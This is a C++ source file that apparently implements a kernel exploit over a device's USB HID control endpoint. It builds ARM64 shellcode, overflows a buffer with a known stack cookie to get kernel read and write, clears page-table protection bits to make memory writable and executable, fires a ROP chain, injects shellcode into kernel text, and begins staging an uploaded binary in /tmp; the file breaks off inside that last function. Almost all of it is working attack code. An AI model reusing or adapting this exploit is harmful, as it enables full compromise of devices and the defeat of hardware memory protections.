#include "rw.hpp"

#include <chrono>
#include <cstdint>
#include <cstring>
#include <fstream>
#include <iostream>
#include <thread>

#include "constants.hpp"
#include "logger.hpp"
#include "utils.hpp"


static void pack_q(std::vector<uint8_t>& buf, uint64_t val) {
    uint8_t* p = reinterpret_cast<uint8_t*>(&val);
    buf.insert(buf.end(), p, p + 8);
}

static inline void store_le32(uint8_t* p, uint32_t val) { std::memcpy(p, &val, 4); }

static inline void store_le64(uint8_t* p, uint64_t val) { std::memcpy(p, &val, 8); }

static inline uint64_t load_le64(const uint8_t* p) {
    uint64_t val;
    std::memcpy(&val, p, 8);
    return val;
}

static bool arm64_branch(uint64_t from, uint64_t to, bool link, uint32_t* instruction) {
    if (!instruction || (from & 3U) != 0 || (to & 3U) != 0) return false;
    int64_t offset = (int64_t)(to - from);
    if (offset < -((int64_t)0x8000000) || offset > (int64_t)0x7FFFFFC) return false;
    uint32_t immediate = (uint32_t)(((uint64_t)(offset >> 2)) & 0x03FFFFFF);
    *instruction = (link ? 0x94000000 : 0x14000000) | immediate;
    return true;
}

static bool build_direct_context_helper(uint8_t out[constants::DIRECT_CONTEXT_SC_SIZE]) {
    std::memset(out, 0, constants::DIRECT_CONTEXT_SC_SIZE);
    uint32_t branch;
    store_le32(out + 0, 0xF9400260);   // ldr x0, [x19]
    store_le32(out + 4, 0x91004000);   // add x0, x0, #0x10
    store_le32(out + 8, 0xA9005013);   // stp x19, x20, [x0]
    store_le32(out + 12, 0xA9015815);  // stp x21, x22, [x0, #0x10]
    if (!arm64_branch(constants::DIRECT_CONTEXT_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch)) return false;
    store_le32(out + 16, branch);
    return true;
}

static bool build_direct_read_helper(uint8_t out[constants::DIRECT_READ_SC_SIZE]) {
    std::memset(out, 0, constants::DIRECT_READ_SC_SIZE);
    uint32_t branch;
    const uint32_t setup[] = {
        0xF9400260,  // ldr x0, [x19]
        0x91004000   // add x0, x0, #0x10
    };

    // Byte entry
    store_le32(out + 0, setup[0]);      // ldr x0, [x19]
    store_le32(out + 4, setup[1]);      // add x0, x0, #0x10
    store_le32(out + 8, 0x394003A1);   // ldrb w1, [x29]
    store_le32(out + 12, 0x39000001);  // strb w1, [x0]
    if (!arm64_branch(constants::DIRECT_READ_BYTE_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch)) return false;
    store_le32(out + 16, branch);       // b MTU3_COMPLETE_RESUME

    // QWord entry
    store_le32(out + 20, setup[0]);     // ldr x0, [x19]
    store_le32(out + 24, setup[1]);     // add x0, x0, #0x10
    store_le32(out + 28, 0xF94003A1);  // ldr x1, [x29]
    store_le32(out + 32, 0xF9000001);  // str x1, [x0]
    if (!arm64_branch(constants::DIRECT_READ_QWORD_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch)) return false;
    store_le32(out + 36, branch);       // b MTU3_COMPLETE_RESUME

    // Block entry (reads 64 bytes via 4 pairs of registers)
    store_le32(out + 40, setup[0]);     // ldr x0, [x19]
    store_le32(out + 44, setup[1]);     // add x0, x0, #0x10
    const uint32_t block[] = {
        0xA9400BA1,  // ldp x1, x2, [x29]
        0xA9000801,  // stp x1, x2, [x0]
        0xA9410BA1,  // ldp x1, x2, [x29, #0x10]
        0xA9010801,  // stp x1, x2, [x0, #0x10]
        0xA9420BA1,  // ldp x1, x2, [x29, #0x20]
        0xA9020801,  // stp x1, x2, [x0, #0x20]
        0xA9430BA1,  // ldp x1, x2, [x29, #0x30]
        0xA9030801   // stp x1, x2, [x0, #0x30]
    };
    for (size_t i = 0; i < 8; i++) store_le32(out + 48 + i * 4, block[i]);
    if (!arm64_branch(constants::DIRECT_READ_BLOCK_SC + 40, constants::MTU3_COMPLETE_RESUME, false, &branch)) return false;
    store_le32(out + 80, branch);       // b MTU3_COMPLETE_RESUME
    return true;
}

static bool build_cold_cleanup_helper(uint64_t address, uint8_t out[constants::COLD_CLEANUP_SIZE]) {
    std::memset(out, 0, constants::COLD_CLEANUP_SIZE);
    uint32_t branch;
    store_le32(out + 0, 0xF9400E60);   // ldr x0, [x19, #0x18]
    store_le32(out + 4, 0xB9402261);   // ldr w1, [x19, #0x20]
    if (!arm64_branch(address + 8, constants::PATCH_TEXT, true, &branch)) return false;
    store_le32(out + 8, branch);       // bl PATCH_TEXT
    store_le32(out + 12, 0xF9403EB4);  // ldr x20, [x21, #0x78]  ; x20 = mep (ep0)
    store_le32(out + 16, 0xAA1503E0);  // mov x0, x21            ; x0 = &mtu->lock
    if (!arm64_branch(address + 20, constants::RAW_SPIN_LOCK_ADDR, true, &branch)) return false;
    store_le32(out + 20, branch);      // bl RAW_SPIN_LOCK_ADDR
    store_le32(out + 24, 0x3903369F);  // strb wzr, [x20, #0xcd] ; mep->busy = 0
    if (!arm64_branch(address + 28, constants::MTU3_EP0_ISR_EPILOGUE, false, &branch)) return false;
    store_le32(out + 28, branch);      // b MTU3_EP0_ISR_EPILOGUE
    return true;
}

static bool append_cold_patch(uint8_t stage[constants::COLD_BOOTSTRAP_STAGE_SIZE], size_t* count, uint64_t target, uint32_t instruction) {
    constexpr size_t COLD_DESCRIPTOR_OFFSET = 0x180;
    constexpr size_t COLD_TARGETS_OFFSET = 0x1C0;
    constexpr size_t COLD_INSTRUCTIONS_OFFSET = 0x300;

    if (!stage || !count || *count >= 40) return false;
    store_le64(stage + COLD_TARGETS_OFFSET + *count * 8, target);
    store_le32(stage + COLD_INSTRUCTIONS_OFFSET + *count * 4, instruction);
    (*count)++;
    store_le32(stage + COLD_DESCRIPTOR_OFFSET + 0x10, (uint32_t)*count);
    return true;
}

static bool build_cold_bootstrap(uint64_t req_buf, uint8_t stage[constants::COLD_BOOTSTRAP_STAGE_SIZE], uint8_t payload[constants::COLD_BOOTSTRAP_PAYLOAD_SIZE]) {
    uint8_t direct_context[constants::DIRECT_CONTEXT_SC_SIZE];
    uint8_t direct_read[constants::DIRECT_READ_SC_SIZE];
    if (!build_direct_context_helper(direct_context) || !build_direct_read_helper(direct_read)) return false;

    uint8_t cleanup[constants::COLD_CLEANUP_SIZE];
    uint32_t branch;
    if (!build_cold_cleanup_helper(constants::COLD_CLEANUP_SC, cleanup)) return false;

    std::memset(stage, 0, constants::COLD_BOOTSTRAP_STAGE_SIZE);
    store_le64(stage + 0x180, req_buf + 0x1C0);
    store_le64(stage + 0x180 + 8, req_buf + 0x300);
    store_le64(stage + 0x180 + 0x18, constants::COLD_PATCH_EXIT);
    store_le32(stage + 0x180 + 0x20, constants::COLD_PATCH_EXIT_ORIGINAL);
    store_le64(stage + constants::COLD_MARKER_OFFSET, constants::COLD_MARKER_MAGIC0);
    store_le64(stage + constants::COLD_MARKER_OFFSET + 8, constants::COLD_MARKER_MAGIC1);
    store_le64(stage + constants::COLD_MARKER_OFFSET + 16, req_buf);
    store_le64(stage + constants::COLD_MARKER_OFFSET + 24, req_buf ^ constants::COLD_MARKER_XOR);

    size_t count = 0;
    for (size_t offset = 0; offset < sizeof(cleanup); offset += 4) {
        uint32_t inst;
        std::memcpy(&inst, cleanup + offset, 4);
        if (!append_cold_patch(stage, &count, constants::COLD_CLEANUP_SC + offset, inst)) return false;
    }
    for (size_t offset = 0; offset < sizeof(direct_context); offset += 4) {
        uint32_t inst;
        std::memcpy(&inst, direct_context + offset, 4);
        if (!append_cold_patch(stage, &count, constants::DIRECT_CONTEXT_SC + offset, inst)) return false;
    }
    for (size_t offset = 0; offset < sizeof(direct_read); offset += 4) {
        uint32_t inst;
        std::memcpy(&inst, direct_read + offset, 4);
        if (!append_cold_patch(stage, &count, constants::DIRECT_READ_SC + offset, inst)) return false;
    }
    if (!arm64_branch(constants::COLD_PATCH_EXIT, constants::COLD_CLEANUP_SC, false, &branch) || !append_cold_patch(stage, &count, constants::COLD_PATCH_EXIT, branch)) return false;

    std::memset(payload, 0, constants::COLD_BOOTSTRAP_PAYLOAD_SIZE);
    payload[0] = 0xF0;
    payload[1] = 0x02;
    store_le64(payload + 64, constants::STACK_COOKIE);
    store_le64(payload + 80, constants::COLD_PATCH_EPILOGUE);
    store_le64(payload + 96, constants::COLD_PATCH_LOOP);
    store_le64(payload + 104, req_buf + 0x180);
    return true;
}

static bool parse_cold_bootstrap_marker(const std::vector<uint8_t>& stage, uint64_t* request_buffer) {
    if (request_buffer) *request_buffer = 0;
    if (stage.size() < constants::COLD_MARKER_OFFSET + 32 || !request_buffer) return false;

    const uint8_t* marker = stage.data() + constants::COLD_MARKER_OFFSET;
    uint64_t address = load_le64(marker + 16);
    if (load_le64(marker) != constants::COLD_MARKER_MAGIC0 || load_le64(marker + 8) != constants::COLD_MARKER_MAGIC1 || load_le64(marker + 24) != (address ^ constants::COLD_MARKER_XOR) ||
        address < constants::PAGE_OFFSET_BASE || (address & (constants::COLD_BOOTSTRAP_STAGE_SIZE - 1U)) != 0)
        return false;
    *request_buffer = address;
    return true;
}

static bool find_request_buffer(const std::vector<uint8_t>& disclosure, uint64_t* request_buffer, unsigned* votes_out) {
    if (request_buffer) *request_buffer = 0;
    if (votes_out) *votes_out = 0;
    if (disclosure.size() < 8 || !request_buffer) return false;

    const uint8_t* bytes = disclosure.data();
    uint64_t best_base = 0;
    unsigned best_votes = 0;

    for (size_t candidate_offset = 0; candidate_offset + 8 <= disclosure.size(); candidate_offset += 8) {
        uint64_t pointer = load_le64(bytes + candidate_offset);
        if (pointer < constants::PAGE_OFFSET_BASE || pointer < candidate_offset) continue;
        uint64_t base = pointer - candidate_offset;
        if ((base & (constants::COLD_BOOTSTRAP_STAGE_SIZE - 1U)) != 0) continue;

        unsigned votes = 0;
        for (size_t offset = 0; offset + 8 <= disclosure.size(); offset += 8) {
            uint64_t value = load_le64(bytes + offset);
            if (value == base + offset) votes++;
        }
        if (votes > best_votes) {
            best_base = base;
            best_votes = votes;
        }
    }

    if (votes_out) *votes_out = best_votes;
    LOG_DEBUG << "    [disc] find_request_buffer: best_base=0x" << std::hex << best_base << " best_votes=" << std::dec << best_votes << "\n";

    if (best_votes < 4 || best_base < constants::PAGE_OFFSET_BASE) return false;
    *request_buffer = best_base;
    return true;
}

bool KernelRW::setup_read() {
    if (request_buffer != 0) return true;

    // Disassembly at constants::CLEAN_RETURN (0xFFFFFFC000305778):
    // 0xFD, 0x7B, 0xC1, 0xA8 -> ldp x29, x30, [sp], #0x10
    // 0xC0, 0x03, 0x5F, 0xD6 -> ret
    static const uint8_t clean_epilogue[] = {0xfd, 0x7b, 0xc1, 0xa8, 0xc0, 0x03, 0x5f, 0xd6};

    std::vector<uint8_t> disclosure = usb->hid_get(0xF2, 0x00, 0x1000);
    if (disclosure.size() != 0x1000) {
        LOG_ERROR << "    [-] EP0 disclosure was short (" << disclosure.size() << "/0x1000 bytes).\n";
        return false;
    }

    uint64_t req_buf = 0;
    unsigned votes = 0;

    if (parse_cold_bootstrap_marker(disclosure, &req_buf)) {
        request_buffer = req_buf;

        uint8_t test_buf[8] = {0};
        uint8_t context_buf[32] = {0};
        uint64_t live[4] = {0};
        bool text_ok = direct_read_raw(constants::CLEAN_RETURN, test_buf, 8) && std::memcmp(test_buf, clean_epilogue, 8) == 0;
        bool context_ok = false;

        if (text_ok && direct_exchange(1, constants::DIRECT_CONTEXT_SC, context_buf, 32)) {
            live[0] = load_le64(context_buf + 0);
            live[1] = load_le64(context_buf + 8);
            live[2] = load_le64(context_buf + 16);
            live[3] = load_le64(context_buf + 24);

            uint64_t verify_buf = 0;
            uint64_t verify_mep = 0;
            context_ok = (live[0] >= constants::PAGE_OFFSET_BASE && live[1] >= constants::PAGE_OFFSET_BASE && live[2] >= constants::PAGE_OFFSET_BASE && live[3] <= 255 &&
                          direct_read_raw(live[0], (uint8_t*)&verify_buf, 8) && verify_buf == req_buf && direct_read_raw(live[0] + 0x68, (uint8_t*)&verify_mep, 8) && verify_mep == live[1]);
        }

        if (text_ok && context_ok) {
            LOG_DEBUG << "    [+] Reusing installed reader (EP0 buffer: 0x" << std::hex << req_buf << std::dec << ")\n";
            return true;
        }

        request_buffer = 0;
        LOG_WARN << "    [-] Installed direct-reader self-test failed (text=" << (text_ok ? "ok" : "mismatch") << ", context=" << (context_ok ? "ok" : "mismatch") << "). Re-bootstrapping reader...\n";
    }

    if (!find_request_buffer(disclosure, &req_buf, &votes)) {
        LOG_ERROR << "    [-] Exact EP0 self-map and installed-state marker were not found.\n";
        return false;
    }

    std::vector<uint8_t> stage(constants::COLD_BOOTSTRAP_STAGE_SIZE, 0);
    std::vector<uint8_t> payload(constants::COLD_BOOTSTRAP_PAYLOAD_SIZE, 0);
    if (!build_cold_bootstrap(req_buf, stage.data(), payload.data())) {
        LOG_ERROR << "    [-] Exact cold-bootstrap encoding failed.\n";
        return false;
    }

    LOG_DEBUG << "    [+] EP0 buffer: 0x" << std::hex << req_buf << std::dec << " (" << votes << " exact self-references)\n";

    if (usb->hid_set(0xFF, 0xFF, stage) != (int)stage.size()) {
        LOG_ERROR << "    [-] EP0 patch-table staging failed.\n";
        return false;
    }

    if (usb->hid_set(0xF0, 0x01, payload) != (int)payload.size()) {
        LOG_ERROR << "    [-] Exact cold-bootstrap transfer failed.\n";
        return false;
    }

    request_buffer = req_buf;

    uint8_t test_buf[8] = {0};
    if (!direct_read_raw(constants::CLEAN_RETURN, test_buf, 8) || std::memcmp(test_buf, clean_epilogue, 8) != 0) {
        request_buffer = 0;
        LOG_ERROR << "    [-] Direct read self-test failed.\n";
        return false;
    }

    return true;
}

uint64_t KernelRW::retrieve_get_alt() { return 0; }

bool KernelRW::direct_exchange(uint64_t target, uint64_t helper, uint8_t* out, size_t length) {
    if (!out || !length || length > 64) return false;

    std::vector<uint8_t> payload(88, 0);
    payload[0] = 0xF0;
    payload[1] = 0x02;

    uint64_t cookie = constants::STACK_COOKIE;
    store_le64(payload.data() + 64, cookie);
    store_le64(payload.data() + 72, target);
    store_le64(payload.data() + 80, helper);

    int sent = usb->hid_set(0xF0, 0x01, payload);
    if (sent != (int)payload.size()) return false;

    uint16_t response_length = static_cast<uint16_t>(16 + length);
    std::vector<uint8_t> response;
    for (int retry = 0; retry < 3; ++retry) {
        response = usb->hid_get(0xF2, 0, response_length);
        if (response.size() >= response_length && response[0] == 0xF2) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }
    if (response.size() < response_length || response[0] != 0xF2) return false;

    std::memcpy(out, response.data() + 16, length);
    return true;
}

static size_t direct_read_transfer_size(uint64_t address, size_t remaining, uint64_t* helper) {
    size_t page_remaining = 0x1000 - (size_t)(address & (0x1000 - 1));
    if (remaining >= 64 && page_remaining >= 64) {
        *helper = constants::DIRECT_READ_BLOCK_SC;
        return 64;
    }
    if (remaining >= 8 && page_remaining >= 8) {
        *helper = constants::DIRECT_READ_QWORD_SC;
        return 8;
    }
    *helper = constants::DIRECT_READ_BYTE_SC;
    return 1;
}

bool KernelRW::direct_read_raw(uint64_t address, uint8_t* out, size_t length) {
    if (!out || !length || address > UINT64_MAX - static_cast<uint64_t>(length - 1)) return false;

    for (size_t offset = 0; offset < length;) {
        uint64_t helper = 0;
        size_t count = direct_read_transfer_size(address + offset, length - offset, &helper);
        if (!direct_exchange(address + offset, helper, out + offset, count)) {
            return false;
        }
        offset += count;
    }
    return true;
}

std::vector<uint8_t> KernelRW::read(uint64_t addr, size_t length) {
    if (length == 0) return {};
    std::vector<uint8_t> data(length);
    if (!direct_read_raw(addr, data.data(), length)) {
        return {};
    }
    return data;
}

uint64_t KernelRW::read_ptr(uint64_t addr) {
    auto d = read(addr, 8);
    return d.size() == 8 ? constants::u64(d.data()) : 0;
}

void KernelRW::repair_descriptor() {}

Registers KernelRW::discover_registers() {
    if (cached_registers.req != 0 && cached_registers.mep != 0 && cached_registers.x21 != 0) {
        return cached_registers;
    }

    uint8_t data[32] = {0};
    if (!direct_exchange(1, constants::DIRECT_CONTEXT_SC, data, 32)) {
        LOG_ERROR << "[-] direct_exchange for DIRECT_CONTEXT_SC failed.\n";
        return cached_registers;
    }

    cached_registers.req = load_le64(data + 0);
    cached_registers.mep = load_le64(data + 8);
    cached_registers.x21 = load_le64(data + 16);

    sauth = read_ptr(constants::SAUTH_SIEUSB);

    LOG_DEBUG << "[*] Discovery Results:\n"
              << "    - req: 0x" << std::hex << cached_registers.req << "\n"
              << "    - mep: 0x" << std::hex << cached_registers.mep << "\n"
              << "    - x21: 0x" << std::hex << cached_registers.x21 << " (spinlock)\n"
              << "    - sauth: 0x" << std::hex << sauth << "\n";

    return cached_registers;
}

bool KernelRW::setup_write() {
    Registers regs = discover_registers();

    if (regs.req < 0xffffffc000000000 || regs.mep < 0xffffffc000000000 || regs.x21 < 0xffffffc000000000) {
        LOG_ERROR << "Discovered registers do not look like pointers!" << std::endl;
        return false;
    }

    repair_descriptor();

    if (regs.x21 != 0) {
        auto existing = read(constants::TEXT_STR_SC, 16);
        std::ostringstream oss;
        oss << "[";
        for (uint8_t b : existing) oss << " 0x" << std::hex << (int)b;
        oss << " ]\n";
        LOG_DEBUG << oss.str();

        if (existing == constants::STR_SHELLCODE) {
            LOG_DEBUG << "[+] Shellcode already present.\n";
            return true;
        }

        LOG_DEBUG << "[*] Injecting STR shellcode...\n";

        patch_rwx(constants::TEXT_STR_SC, 0x1000);
        patch_rwx(constants::BSS_DATA, 0x1000);

        uint64_t patchLE = 0x17FFFFEBD503201F;
        patch_rwx(0xffffffbffc0a656C, 0x1000);

        execute_tlb_flush();

        // Write shellcode byte-by-byte
        LOG_DEBUG << "    Writing " << std::dec << constants::STR_SHELLCODE.size() << " bytes to 0x" << std::hex << constants::TEXT_STR_SC << "\n";
        for (size_t i = 0; i < constants::STR_SHELLCODE.size(); i++) {
            write_byte(constants::TEXT_STR_SC + i, constants::STR_SHELLCODE[i]);
        }

        // Verify
        auto check = read(constants::TEXT_STR_SC, constants::STR_SHELLCODE.size());
        bool ok = (check == constants::STR_SHELLCODE);
        LOG_DEBUG << "    " << (ok ? "Verified" : "MISMATCH!") << "\n";

        write_u64_fast(0xffffffbffc0a656C, patchLE);

        return ok;
    }
    return false;
}

std::vector<uint8_t> KernelRW::_trigger_overflow(const std::vector<uint8_t>& payload) {
    int res = usb->hid_set(0xF0, 0x01, payload);
    return res > 0 ? std::vector<uint8_t>{1} : std::vector<uint8_t>{};
}

bool KernelRW::write_byte(uint64_t addr, uint8_t val) {
    std::vector<uint8_t> buf = {0xF0, 0x01};
    buf.insert(buf.end(), 62, 0x00);
    pack_q(buf, constants::STACK_COOKIE);
    pack_q(buf, 0);                        // X29
    pack_q(buf, constants::CLEAN_RETURN);  // X30
    pack_q(buf, 0);                        // X19
    pack_q(buf, addr - 0xCD);              // X20
    pack_q(buf, cached_registers.x21);     // X21
    pack_q(buf, val);                      // X22

    if (_trigger_overflow(buf).empty()) return false;

    // Restore proper value for spinlock bit (mep->busy = 0)
    if (cached_registers.mep != 0 && addr != cached_registers.mep + 0xCD) {
        std::vector<uint8_t> restore_buf = {0xF0, 0x01};
        restore_buf.insert(restore_buf.end(), 62, 0x00);
        pack_q(restore_buf, constants::STACK_COOKIE);
        pack_q(restore_buf, 0);                        // X29
        pack_q(restore_buf, constants::CLEAN_RETURN);  // X30
        pack_q(restore_buf, 0);                        // X19
        pack_q(restore_buf, cached_registers.mep);     // X20 (writes to [mep, #0xCD])
        pack_q(restore_buf, cached_registers.x21);     // X21
        pack_q(restore_buf, 0);                        // X22 (proper value: 0)

        return !_trigger_overflow(restore_buf).empty();
    }

    return true;
}

bool KernelRW::write_u64_slow(uint64_t addr, uint64_t val) {
    for (int i = 0; i < 8; i++) {
        if (!write_byte(addr + i, (val >> (i * 8)) & 0xFF)) return false;
    }
    return true;
}

bool KernelRW::write_u64_fast(uint64_t addr, uint64_t val) {
    std::vector<uint8_t> buf = {0xF0, 0x01};
    buf.insert(buf.end(), 62, 0x00);
    pack_q(buf, constants::STACK_COOKIE);
    pack_q(buf, 0);                       // X29
    pack_q(buf, constants::TEXT_STR_SC);  // X30
    pack_q(buf, val);                     // X19
    pack_q(buf, addr);                    // X20
    pack_q(buf, cached_registers.x21);    // X21
    pack_q(buf, 0);                       // X22 (proper value: 0 for mep->busy)

    return !_trigger_overflow(buf).empty();
}

bool KernelRW::write_data_slow(uint64_t addr, const std::vector<uint8_t>& data) {
    for (size_t i = 0; i < data.size(); i++) {
        if (!write_byte(addr + i, data[i])) return false;
    }
    return true;
}

bool KernelRW::write_data_fast(uint64_t addr, const std::vector<uint8_t>& data) {
    for (size_t i = 0; i < data.size(); i += 8) {
        size_t remaining = data.size() - i;
        if (remaining >= 8) {
            uint64_t val = *reinterpret_cast<const uint64_t*>(data.data() + i);
            if (!write_u64_fast(addr + i, val)) return false;
        } else {
            for (size_t j = 0; j < remaining; j++) {
                if (!write_byte(addr + i + j, data[i + j])) return false;
            }
        }
    }
    return true;
}

bool KernelRW::patch_rwx(uint64_t base_vaddr, size_t total_size) {
    auto phys_to_virt = [](uint64_t phys) -> uint64_t { return phys - constants::PHYS_OFFSET + constants::PAGE_OFFSET_BASE; };

    LOG_DEBUG << "[*] Sweeping PTEs for " << std::dec << total_size << " bytes at 0x" << std::hex << base_vaddr << "...\n";

    uint64_t last_pgd_idx = -1;
    uint64_t pgd_entry = 0;

    uint64_t last_pmd_idx = -1;
    uint64_t pmd_entry = 0;

    // Loop through every 4KB page in the requested size
    for (uint64_t offset = 0; offset < total_size; offset += 0x1000) {
        uint64_t vaddr = base_vaddr + offset;

        uint64_t pgd_idx = (vaddr >> 30) & 0x1FF;
        uint64_t pmd_idx = (vaddr >> 21) & 0x1FF;
        uint64_t pte_idx = (vaddr >> 12) & 0x1FF;

        if (pgd_idx != last_pgd_idx) {
            pgd_entry = read_ptr(constants::SWAPPER_PG_DIR + (pgd_idx * 8));
            last_pgd_idx = pgd_idx;
            last_pmd_idx = -1;  // Invalidate the cached PMD when crossing 1GB boundary
        }
        if (!(pgd_entry & 1)) continue;

        if (pmd_idx != last_pmd_idx) {
            uint64_t pmd_addr = phys_to_virt(pgd_entry & ~0xFFF);
            pmd_entry = read_ptr(pmd_addr + (pmd_idx * 8));
            last_pmd_idx = pmd_idx;
        }
        if (!(pmd_entry & 1)) continue;

        // Check if PMD is a 2MB block mapping
        if ((pmd_entry & 3) == 1) {
            uint64_t new_pmd = pmd_entry;
            new_pmd &= ~(1ULL << 53);  // Clear PXN (Make Executable)
            new_pmd &= ~(1ULL << 7);   // Clear AP[2] (Make Writable)

            uint64_t pmd_addr = phys_to_virt(pgd_entry & ~0xFFF);
            uint64_t pmd_target_addr = pmd_addr + (pmd_idx * 8);

            for (int i = 0; i < 8; i++) {
                uint8_t old_byte = (pmd_entry >> (i * 8)) & 0xFF;
                uint8_t new_byte = (new_pmd >> (i * 8)) & 0xFF;
                if (old_byte != new_byte) {
                    if (!write_byte(pmd_target_addr + i, new_byte)) {
                        LOG_ERROR << "[-] Failed to patch byte " << i << " of PMD at 0x" << std::hex << pmd_target_addr << ".\n";
                        return false;
                    }
                }
            }

            // Advance offset to the end of the 2MB block so we don't unnecessarily check every 4KB page
            uint64_t next_pmd_boundary = (vaddr & ~0x1FFFFFULL) + 0x200000;
            uint64_t skip_bytes = next_pmd_boundary - vaddr;
            if (skip_bytes > 0x1000) {
                offset += (skip_bytes - 0x1000);
            }
            pmd_entry = new_pmd;
        }
        // It's a standard Page Table Mapping (Level 3 PTEs)
        else if ((pmd_entry & 3) == 3) {
            uint64_t pte_addr = phys_to_virt(pmd_entry & ~0xFFF) + (pte_idx * 8);
            uint64_t pte_val = read_ptr(pte_addr);

            if (pte_val & 1) {  // If PTE is valid
                uint64_t new_pte = pte_val;
                new_pte &= ~(1ULL << 53);  // Clear PXN (Make Executable)
                new_pte &= ~(1ULL << 7);   // Clear AP[2] (Make Writable)

                for (int i = 0; i < 8; i++) {
                    uint8_t old_byte = (pte_val >> (i * 8)) & 0xFF;
                    uint8_t new_byte = (new_pte >> (i * 8)) & 0xFF;
                    if (old_byte != new_byte) {
                        if (!write_byte(pte_addr + i, new_byte)) {
                            LOG_ERROR << "[-] Failed to patch byte " << i << " of PTE at 0x" << std::hex << pte_addr << ".\n";
                            return false;
                        }
                    }
                }
            }
        }
    }

    LOG_DEBUG << "[+] Memory is now natively RWX!\n";
    return true;
}

bool KernelRW::execute_tlb_flush() {
    Registers regs = discover_registers();
    if (regs.req == 0 || regs.mep == 0 || regs.x21 == 0) {
        LOG_ERROR << "[-] Failed to discover ISR registers for TLB payload.\n";
        return false;
    }

    LOG_DEBUG << "[*] Writing TLB Shellcode to .bss...\n";
    std::vector<uint8_t> sc = constants::TLB_SHELLCODE;
    pack_q(sc, constants::RAW_SPIN_LOCK_ADDR);
    pack_q(sc, constants::ISR_EPILOGUE_ADDR);

    if (!write_data_slow(constants::BSS_DATA, sc)) return false;

    LOG_DEBUG << "[*] Defeating WXN/PXN hardware protections...\n";
    if (!patch_rwx(constants::BSS_DATA, 0x1000)) return false;

    LOG_DEBUG << "[*] Firing aligned TLB ROP chain...\n";
    std::vector<uint8_t> buf = {0xF0, 0x02};
    buf.insert(buf.end(), 62, 0x00);
    pack_q(buf, constants::STACK_COOKIE);

    // usb_auth_ctrl_complete epilogue
    pack_q(buf, 0);                            // X29
    pack_q(buf, constants::TLBI_GADGET_ADDR);  // X30

    // TLBI Gadget epilogue
    pack_q(buf, 0);                    // SP+0x00: X29
    pack_q(buf, constants::BSS_DATA);  // SP+0x08: X30
    pack_q(buf, regs.req);             // SP+0x10: X19
    pack_q(buf, regs.mep);             // SP+0x18: X20
    pack_q(buf, regs.x21);             // SP+0x20: X21
    pack_q(buf, 0);                    // SP+0x28: Padding

    int res = usb->hid_set(0xF0, 0x02, buf);
    return res > 0;
}

void replace_quad(std::vector<uint8_t>& buf, uint64_t marker, uint64_t value) {
    for (size_t i = 0; i <= buf.size() - 8; i++) {
        if (*reinterpret_cast<uint64_t*>(&buf[i]) == marker) {
            *reinterpret_cast<uint64_t*>(&buf[i]) = value;
            return;
        }
    }
}

bool KernelRW::trigger_workqueue(uint64_t target_func_addr) {
    uint64_t addr_work_struct = constants::TEXT_DATA + 0x50;
    uint64_t addr_irq = constants::TEXT_DATA + 0x70;

    std::vector<uint8_t> payload;

    uint64_t WORK_STRUCT_NO_POOL = 0x0FFFFFFFE0;
    uint64_t entry_addr = addr_work_struct + 0x08;
    pack_q(payload, WORK_STRUCT_NO_POOL);
    pack_q(payload, entry_addr);
    pack_q(payload, entry_addr);
    pack_q(payload, target_func_addr);

    std::vector<uint8_t> stage1_sc = {
        0xFD, 0x7B, 0xBF, 0xA9,  // 0x00: STP X29, X30, [SP, #-0x10]!

        0xA4, 0x02, 0x00, 0x58,  // 0x04: LDR X4, pc+84 -> Loads target_func_addr (from 0x58)
        0x24, 0x7B, 0x0B, 0xD5,  // 0x08: DC CVAU, X4
        0x24, 0x75, 0x0B, 0xD5,  // 0x0C: IC IVAU, X4
        0x84, 0x00, 0x01, 0x91,  // 0x10: ADD X4, X4, #64
        0x24, 0x7B, 0x0B, 0xD5,  // 0x14: DC CVAU, X4
        0x24, 0x75, 0x0B, 0xD5,  // 0x18: IC IVAU, X4
        0x84, 0x00, 0x01, 0x91,  // 0x1C: ADD X4, X4, #64
        0x24, 0x7B, 0x0B, 0xD5,  // 0x20: DC CVAU, X4
        0x24, 0x75, 0x0B, 0xD5,  // 0x24: IC IVAU, X4
        0x9F, 0x3B, 0x03, 0xD5,  // 0x28: DSB ISH
        0xDF, 0x3F, 0x03, 0xD5,  // 0x2C: ISB

        0x80, 0x00, 0x80, 0x52,  // 0x30: MOV W0, #4 (WORK_CPU_UNBOUND)
        0x61, 0x01, 0x00, 0x58,  // 0x34: LDR X1, pc+44 -> SYSTEM_WQ (from 0x60)
        0x21, 0x00, 0x40, 0xF9,  // 0x38: LDR X1, [X1]
        0x62, 0x01, 0x00, 0x58,  // 0x3C: LDR X2, pc+44 -> addr_work_struct (from 0x68)
        0x83, 0x01, 0x00, 0x58,  // 0x40: LDR X3, pc+48 -> QUEUE_WORK_ON (from 0x70)
        0x60, 0x00, 0x3F, 0xD6,  // 0x44: BLR X3

        0x00, 0x00, 0x80, 0xD2,  // 0x48: MOV X0, #0
        0xFD, 0x7B, 0xC1, 0xA8,  // 0x4C: LDP X29, X30, [SP], #0x10
        0xC0, 0x03, 0x5F, 0xD6,  // 0x50: RET
        0x1F, 0x20, 0x03, 0xD5   // 0x54: NOP (Aligns exactly to 0x58)
    };

    pack_q(stage1_sc, target_func_addr);          // 0x58
    pack_q(stage1_sc, constants::SYSTEM_WQ);      // 0x60
    pack_q(stage1_sc, addr_work_struct);          // 0x68
    pack_q(stage1_sc, constants::QUEUE_WORK_ON);  // 0x70

    payload.insert(payload.end(), stage1_sc.begin(), stage1_sc.end());
    write_data_fast(addr_work_struct, payload);

    write_u64_fast(read_ptr(constants::SAUTH_SIEUSB) + constants::GET_ALT_OFFSET, addr_irq);
    usb->trigger_get_alt();
    return true;
}

bool KernelRW::upload_to_tmp(const std::string& local_path, const std::string& remote_name) {
    std::ifstream elf_file(local_path, std::ios::binary);
    if (!elf_file) {
        LOG_ERROR << "[-] Could not read local file '" << local_path << "'.\n";
        return false;
    }
    std::vector<uint8_t> elf_data((std::istreambuf_iterator<char>(elf_file)), {});

    uint64_t addr_filename = rwx_base + 0x100;
    uint64_t addr_debug_flag = rwx_base + 0x200;
    uint64_t addr_shellcode = rwx_base + 0x1000;
    uint64_t addr_elf_data = rwx_base + 0x2000;

    LOG_DEBUG << "[*] Streaming " << elf_data.size() << " bytes to kernel vmalloc buffer...\n";
    write_data_fast(addr_elf_data, elf_data);

    std::string target_path = "/tmp/" + remote_name;
    std::vector<uint8_t> filename_data(target_path.begin(), target_path.end());
    filename_data.push_back(0);
